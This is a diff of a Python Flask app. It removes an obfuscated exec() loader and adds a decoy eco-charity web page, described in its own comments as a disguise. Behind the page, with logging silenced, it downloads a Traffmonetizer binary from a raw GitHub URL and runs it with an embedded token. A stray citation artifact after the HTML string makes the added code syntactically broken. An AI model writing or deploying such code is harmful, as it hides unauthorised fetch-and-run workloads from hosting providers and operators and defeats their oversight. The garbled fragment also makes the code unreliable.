@@ -1,1 +1,310 @@
-_ = (lambda __: __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]))); exec(_('7nlxrcB+TsmfBTCt9DogjzP2ohLJNW2Zy71S0WtJLPLpc/B1qZ2kTPKXbz1yrFgDREZ+aFnjPmMtGPb0ZHg4SSbkSmdLsQemvkV2msEgSQyBOwPa0A+ymwd/tki60t1yUhxTNJfHpWBiVX7YCCFUZCB5n1Flo5airlMIGF4Bofnf9c/4E1apwyd/uxa3togy9LVy0v+qMe9Cr/2NF1bsUw6Th3vRybcQ+PNZ2vrf6OF36fd/aXtzof9ba46zb4SVRT2netHMg2h+oE6JglV5Wpx/lZWWxW3M2S1mlNXZVZrEvAj0AGYBJ30ePckDI4iOlJIcT0yOAy5xwz2t2/n/91d9Y63Id3+kuq/ca+t0ghjM/uFSEAYqyqkSrZrG3en63pUjdcYd7T1iNRd62dZbOGsja9yPuy1fX/3dVvUtMiAPwoDOIAYhJUt4QBGa/hMh9EpddUM9O4G8kn9IMCu99nR64SLD9JygpICKheGxoMH5IQ6FkgK0FLhAh7s3jWEdQw15M7OA710AW1OSMVAy9KZRh1mj+FEPlDFK/K2/+y3+r19d0BnGM9nf9SL8X2x0FvVMrohJ4YmXkAYQydaAEsHOTPzCXDzQ4yxQaV+C82O3/wqs+GbTWvyird3tV5+ZOh7Psa7/fvNMNMbDkD8qH2uR5rW72n+V3v2FOnYaoZr1xoZnuUua5GWxeMfSpGAJDqi5Xfjj1XctrdL77DGFg+lBcwz47mmTYJNWjyLB3hZJswpoBIwCn5iEElhqEw/nx0RZ6SuTZjvtfDuOQenyl5tQHkgTXbcycb4Ox4xBjcRvNo90g5vsxrXQ2LLXa1Q20fYmS/5X1f5KFBQcibXSRpUtwgtDiTOXtj4OfObYN9cYjtdLCPl+VfqgCncsCsbmj4ZZmXoQZ1cbaczvKKkIrpAHin0I6OhMiUMkRnVyeNHIbG36+16c6IwiQUyaoz8qe/77V3dLBMTlZ6efF0v2OTWdINb4gYxThSDCMrALBS1ADN/ir2QtUp4yqpBGf90vwzXeQEOLAjI0PttGIJhxSqhfSvUCIwyv3TwJ7cd7cY2sAOQklefUOcHJnrznPe2wjkYuEXSc6uPk4ZWe7o4+a8Uv4s7MlUJWjlUCSueMku7y11f+BWgzNLDFpMfFMaZaFHGyMXUkKrve7yB+5Vz9TZGKyzDHkUlg4C+4WMiwU7qtL2WncrXJD/3EQsQH8m/zw6d35TggYNnUIkPOlkLyZyKAPguoIz6OHdSZCa48SWTwWPfi0etGYbV58u7Y2YklOauOMJJAh/KgVfsAokiyjoDGvx1qaz1bmabseGvY+zeK3n1rn2EO/Lauadi4JohZVxubWd972dDuMf95J57nUNrMry2azPqZa1tpDwcy5l6mtVnDsO9u63cAOCT2eLx3FLmoIsMsOeYS8kb+BcRBmBxP4q+sMY0Sb4Tp3f8AtMWgU634o5/h6srX6zWup1KbZWKzewKgFIMJ4Bfa/GDDoVJQNG21Lhz2HSUYYUS69l0g6v0SLtHmKz7OF4KyyE708VEZQNhzeJtNFnPoALUknrhNwuyWA5pnTmfUgfcBTupPht2Ime7sj9wbN3vTRhhJW5VY2rStv7i4IGrpJxT5SdGFFGHWbJJYBhyVmCIAR3rEPlzdlqZC+q4vkIosK+6MdsOJArlDodRfKjzTIJMKxexyNAccwlIIN3RDIhmLl7bJiy2uB5ye+9dWPf4XpEOI34/UEGe/MngdsCPjWnpoiZ+aKpiW6Zv91TKsk6SUEFoMuI38I4QXqOkXUlvsMlhwWUREjUsoIu0L1lVFeJmUw6lyYtbJXJpIjye6t9cmk/5+9CZfrrlSqjMjJgCAM4SU/q5IYNuRbQSgSlTWneR2cGHyIwKB86MgEDEYpGBfRkAZn7EmUZUD9Grh5r211gl3vDK3vlKP/fKHzV4NQ8TsXIpQGGFJXASglGARlZThdy4tnctLOv4a1VW6od+5AFW3JuS799asis8NKuvj4Ibli9yvJh1ivb8NMfUYJwQdhQKVG0bPyCaRVwBG1dufzW2+b9zuRpXn20PdLs0Txq15r86Vo5Kg/+b8E7aQtgWQaAPLisPNwB3A6Lusf2VD1T3Gjm+3mrd5sveRCWvOjwu1TSLXxaZRtlnPLSXvF1o+rtUtXlK0vdd6o43IMLolXvs+zpMossxiqxLLXPvanZOKnZnyjXG7GPz21f3H9XEAf0ybP+54H8m8yS3ttW9U3V9SFr+nXAKt0+q8VnHLW9wpc+dVxF7i6HroVu3Wrr21zEK2+UId9pwx9PF0JGZ9xNlDyPWGbq/S7resYd/So/iLMmvPyWc/JVuqX8iodFzg6clFU/7M7ouz51tBA0hLXV7t7+vic8n5vZrDbBkTLeZ928VtXWK9neJr+SnKXgkv0t+UkK1rnFXftwt+ZMTLUFbsheed8Zu+bvCjvectLt4R9o7s39LWl61w57Dp5rbvqR3FpG9zvANw++HV8+5fXwia99X0WpbZJPN9lOsbtfpza+mTLK937GaGq9qHrLW6cORMjdbIrHqZBRMmzXY1w+Wrtm9cCKEwccmrvV1NQMX7NortybIlFd/Ln8djbb8RVHNgZRmsgGbXdqA36rYVt7q118jHW/xdV1azribdsKt0t6erz8+ZN5HmDLV255z/fYx1t6knyFvoti+brW75pz45WyK3d/VvYX8ew2QiKFt3XONB5FtcGvxtNqfV0P3Gk8lRsrfSVqiN31Jj/Yuxzt1qUsa2f1sr+8+0/dtGf8OjPNL6O76nsy2xHhTeb9SormCkC+5apCoAQ7UaX0dxCXvuhaWf50c1Xl601LceJ/k4Oc1ZIl7Ylt8qd8pr0oLLyfA1sjgvVXdjXeiR/7aMiZHOSjB8Dxw6hw9ElWRWE0w8t0BBHOKmwHxFRT78Be3Ff8z/cFiNHTAtULC8MgXC0ngOW/8aBcg2xu9HKNLrFdf7eT8XpNqbeAyZgsfwXXkbOhtChlPV+js+lg9hs3MLdnZ63mZf4L0+mkVaJ0y+L9OF0x3E38oOH0TXjtBwpvxH9OMREs7ffuntcZ7dBtNF0flMY9S6wO84xLwAleJmC1JYOfXcVe4Q6/lOM7P7dq5MZGKBDnTwcXtlcmfhz3p0N2tKOtI3711t254F5Da09XgJqdQGHxaQGb1HIBGXCWonKZuyv4SsHYBv2PPBrqVAgqjCeZ35nW2OVHEOOfrZu1UtP439EoNBNoFWC+QGUh06/iL4lzSOEIxYK9xk/IBCpUxALmUOzvnlgAJiniiIQELVY6JaLHkmyzjFqMjQO56skuDRf3nFzw8c2+VaiNQakNJH94mZVoMPHRf+mmosngpAIiD9dybZRNqeOETdte8B+MSx89KQx9OD9xNjQ3utg1WX9x+6bYjTn5qtB+M9oFLAG8WQPTfQxFJsMBqKkY3PIKJMUoiMGiaTMydVF+WEt7uJGbquvnW7n3kmXraRZ2aOIaU1W4tfj5hV4lZUUXDBBUK30EkIZOeDKVxEn6+nDXEqYBr9euMdaHlEZE8WJ5ZAMJNv7DtlJdzCCxKvD9CLd5BgYAek01+4o4oDlAEyBsn1M8xAutzYg5RjS03AsdBJVP97PUYMRwHNn6M3+KTyhsdRIiT8gSCsG6y7cNGzrICVcfyRmjA04UqlJYosmcmqGdGMcolcCGmCGFHFvcDJEWgIUE6RQmCoxJYHQmY6Brh8fLtbjTkWBRsTRQh1CwB3/DGHiWK3sYEtd3M16zjQqDB4LEBZQjjyi5gLyFyOJQ6IFrxYm0JFPQFgRSGUt3rwHjTWWAVosQEm4NXT80V24qAg3WPUjdgGyu4LQQ4lcq6MHROFZOG2p2QIphCNI4SYSg3SgbCnaq8rxY47jxxvBSaonbQSgxsKE3JvYdw5BQJonIjls4uAJIByPZ7b/A5wjuUExEcBKjA0biUURUUQIgTiFfIMSTYilVK28YiFKN3oZqfPmgAKUYgfIiTpDWTQInh/8QZopGQVSCZcyYpI4n2DeoUQvJ4fTb+u1bxnaOKEMllCM8tehR6nSzg5ZOl0xnO6JHIIeyljbd1d3Bn6YFawG7IqEQInoZySeXwuk6oFGRyj8IY5inDHfKlu6d4BSk1MICJ92Pr+wBfvJUnDOISdB5sKpowEsvtNfHgMK76JZ7JNM1IDr9jVio/tveZse9ZtzttqnbZq+8Mq91NV8+JW4bbpq5fv8XLQE+hT3puImgQoNOahISZRPoxQUADTlAYQbIDF5ZINEYSyCA8VEEJJRwCvDYJ3Aj6wbIYazKhTw5IhOZ0FwlEEVD1sgDCR50HAAcw3hGkD2nzpDMkZuA+kpIEIvEb93zuTJRGE2lHfMywzH/07uSmpDN8ITm84BHP+wzGf4cT3y9acyZ8inTUt+5q1anZl7txyqfhtV/yJT79HV/0Pb4pVsGlupUL6PtqGufL1ID2HU7HZHW4DWmYBfkZRm42zQapWwlAAP22JRgX+EzYSUknEJJRRVlX8zjJiMkoTIVEwJQAnO+4ZSe6QDwH+IoBNo5pgLYp9QN2vRwCAIhA3mv3Og7SCvyec+9buy9SmsL8nq16JymPE74jdYi/8ZPMgf6oRG+IFhXwsTbu/fiRY3FQBCPJn8bsk0spGILAQGe+CJPXmknO45PfOdUTHztcVu85W6qVFTrfN5WrBVkNq7YuowkAAIlITaAMWQljoD/GYZIDUmnQSTqPpwCJFU9hPCc4RDMVkpyN4tN4fEZINhEZDhJA4HC7V/Q1gmI3QiwQ46Zbf3c6T8x+aNkmeatBzo/8cq76H1Gwka3cLpsedAdmyiQfdg81IR16tWIjX6GgD5P/9XZr1udq1ufb1v/g63tbp88O0wEbA7LMQHyX+NUSkNFizIMCWnwA2U0mQtAycVq1XRQae3EtVVgjiqwLrzp1RZSlUf2yCHXABVZmMpRJsk5cUtshFJY+yZNOUnTwTb9gmITwqiwZ4pdPd599nPp7ceqZFFt2c2KBDNTiZ6ZbE7fB9oV/GU6n6gCyyjJGY6EfNsj0VjbLMwNCLgBM/qUJOQQLzZqpM1XiprVVKSZq54rt9Af1aGbjuIii4YcSp6e1Wcdnof+1/2e0GTtnW1yJe'))
+import os
+import time
+import shutil
+import logging
+import threading
+import subprocess
+import urllib.request
+from flask import Flask, Response
+
+# ================= 1. 日志静默配置 =================
+# 屏蔽 Flask/Werkzeug 以及 urllib 的控制台日志输出
+logging.getLogger("werkzeug").setLevel(logging.CRITICAL)
+
+app = Flask(__name__)
+app.logger.disabled = True
+
+# ================= 2. 环境变量与配置 =================
+TOKEN_OR_URL = os.getenv("TOKEN_OR_URL", "UMiNq9PwdIceLTDFaMhSiBsShC/Y5frs9ahOWmmQWBQ=")
+PORT = int(os.getenv("PORT", 5000))
+
+CLI_PATH = "/tmp/Cli"
+current_token = ""
+cli_process = None
+process_lock = threading.Lock()
+
+# 默认内嵌伪装静态网页（绿意同行）
+EMBEDDED_HTML = """<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>绿意同行 - 专注生态保护与低碳生活</title>
+    <style>
+        :root {
+            --primary: #2d6a4f;
+            --primary-light: #52b788;
+            --accent: #d8f3dc;
+            --text-dark: #1b4332;
+            --text-muted: #555;
+            --bg-light: #f7faf8;
+            --white: #ffffff;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", sans-serif;
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            line-height: 1.6;
+        }
+        header {
+            background-color: var(--white);
+            border-bottom: 1px solid #e2ece9;
+            padding: 1.2rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 10;
+        }
+        .logo {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: var(--primary);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        nav a {
+            text-decoration: none;
+            color: var(--text-muted);
+            margin-left: 1.5rem;
+            font-size: 0.95rem;
+            transition: color 0.2s ease;
+        }
+        nav a:hover { color: var(--primary-light); }
+        .hero {
+            padding: 5rem 2rem;
+            text-align: center;
+            background: linear-gradient(180deg, #d8f3dc 0%, var(--bg-light) 100%);
+        }
+        .hero h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+            color: var(--primary);
+        }
+        .hero p {
+            max-width: 600px;
+            margin: 0 auto 2rem auto;
+            color: var(--text-muted);
+            font-size: 1.1rem;
+        }
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            margin-top: 1rem;
+        }
+        .card {
+            background: var(--white);
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
+            border: 1px solid #ebf3ef;
+            transition: transform 0.2s ease;
+        }
+        .card:hover { transform: translateY(-4px); }
+        .card-icon {
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            display: inline-block;
+        }
+        .card h3 {
+            margin-bottom: 0.6rem;
+            color: var(--primary);
+            font-size: 1.25rem;
+        }
+        .card p {
+            color: var(--text-muted);
+            font-size: 0.95rem;
+        }
+        footer {
+            text-align: center;
+            padding: 3rem 1rem;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            border-top: 1px solid #e2ece9;
+            margin-top: 4rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">🌿 绿意同行</div>
+        <nav>
+            <a href="#initiatives">绿色倡议</a>
+            <a href="#actions">日常行动</a>
+            <a href="#about">关于我们</a>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <h1>守护蓝色星球，从身边绿意开始</h1>
+        <p>践行低碳生活方式，促进人与自然和谐共生。我们致力于普及生态环保知识，推动日常低碳行动实践。</p>
+    </section>
+
+    <main class="container" id="initiatives">
+        <div class="grid">
+            <div class="card">
+                <div class="card-icon">🌱</div>
+                <h3>低碳出行</h3>
+                <p>倡导步行、骑行与公共交通，降低化石能源依赖与碳排放，共同呼吸清新空气。</p>
+            </div>
+            <div class="card">
+                <div class="card-icon">♻️</div>
+                <h3>循环利用</h3>
+                <p>减少一次性塑料制品消耗，实行严格垃圾分类，让资源在循环中发挥持久价值。</p>
+            </div>
+            <div class="card">
+                <div class="card-icon">💡</div>
+                <h3>高效节能</h3>
+                <p>合理利用电力与水资源，随手关灯拔插头，推行绿色办公与节约型家居生活。</p>
+            </div>
+        </div>
+    </main>
+
+    <footer>
+        <p>© 2026 绿意同行生态发展公益空间. All rights reserved.</p>
+    </footer>
+</body>
+</html>
+"""[cite: 1]
+
+
+# ================= 3. 后台任务逻辑 =================
+def download_cli():
+    """检测并静默下载 Traffmonetizer Cli 到 /tmp"""
+    if os.path.exists(CLI_PATH) and os.access(CLI_PATH, os.X_OK):
+        return True
+
+    cli_url = "https://raw.githubusercontent.com/yellowbins666/yellowbins666/refs/heads/main/cli"
+    try:
+        req = urllib.request.Request(cli_url, headers={"User-Agent": "Mozilla/5.0"})
+        with urllib.request.urlopen(req, timeout=60) as resp, open(CLI_PATH, "wb") as out_file:
+            shutil.copyfileobj(resp, out_file)
+        os.chmod(CLI_PATH, 0o755)
+        return True
+    except Exception:
+        return False
+
+
+def get_token():
+    """获取最新 Token"""
+    if TOKEN_OR_URL.startswith("http://") or TOKEN_OR_URL.startswith("https://"):
+        try:
+            req = urllib.request.Request(TOKEN_OR_URL, headers={"User-Agent": "Mozilla/5.0"})
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                return resp.read().decode("utf-8").strip()
+        except Exception:
+            return None
+    return TOKEN_OR_URL
+
+
+def run_cli(token):
+    """启动或重启 Cli 进程（静默丢弃标准输出与错误流）"""
+    global cli_process
+
+    if not os.path.exists(CLI_PATH):
+        if not download_cli():
+            return
+
+    with process_lock:
+        if cli_process and cli_process.poll() is None:
+            cli_process.terminate()
+            try:
+                cli_process.wait(timeout=5)
+            except subprocess.TimeoutExpired:
+                cli_process.kill()
+
+        cmd = [CLI_PATH, "start", "accept", "--token", token]
+        env = os.environ.copy()
+        env["HOME"] = "/tmp"
+        env["TMPDIR"] = "/tmp"
+
+        try:
+            cli_process = subprocess.Popen(
+                cmd,
+                cwd="/tmp",
+                env=env,
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+        except Exception:
+            pass
+
+
+def token_watcher():
+    """监控 Token 变更（每 10 分钟）"""
+    global current_token
+    while True:
+        time.sleep(600)
+        new_token = get_token()
+        if new_token and new_token != current_token:
+            current_token = new_token
+            run_cli(current_token)
+
+
+def background_init():
+    """异步初始化后台挂机任务"""
+    global current_token
+    time.sleep(1)
+
+    download_cli()
+    current_token = get_token() or TOKEN_OR_URL
+    run_cli(current_token)
+
+    if TOKEN_OR_URL.startswith("http://") or TOKEN_OR_URL.startswith("https://"):
+        watcher = threading.Thread(target=token_watcher, daemon=True)
+        watcher.start()
+
+
+# ================= 4. Web 与路由配置 =================
+def render_index():
+    """优先读取同目录下的 index.html，没有则使用内嵌模板"""
+    if os.path.exists("index.html"):
+        try:
+            with open("index.html", "r", encoding="utf-8") as f:
+                return f.read()
+        except Exception:
+            pass
+    return EMBEDDED_HTML
+
+
+@app.route("/healthz")
+def healthz():
+    return "OK", 200
+
+
+@app.route("/.well-known/acme-challenge/<path:token>")
+def acme_challenge(token):
+    """放行 Let's Encrypt / ACME 证书校验路由，避免证书签发受阻"""
+    challenge_path = f"/tmp/.well-known/acme-challenge/{token}"
+    if os.path.exists(challenge_path):
+        try:
+            with open(challenge_path, "r", encoding="utf-8") as f:
+                return f.read(), 200
+        except Exception:
+            pass
+    return "Not Found", 404
+
+
+@app.route("/", defaults={"path": ""})
+@app.route("/<path:path>")
+def catch_all(path):
+    """所有常规路径直接展示伪装页面，彻底摆脱外部反代"""
+    return Response(render_index(), status=200, mimetype="text/html")
+
+
+# ================= 5. 主入口 =================
+if __name__ == "__main__":
+    init_thread = threading.Thread(target=background_init, daemon=True)
+    init_thread.start()
+
+    # 启动纯净 Web 服务
+    app.run(host="0.0.0.0", port=PORT)
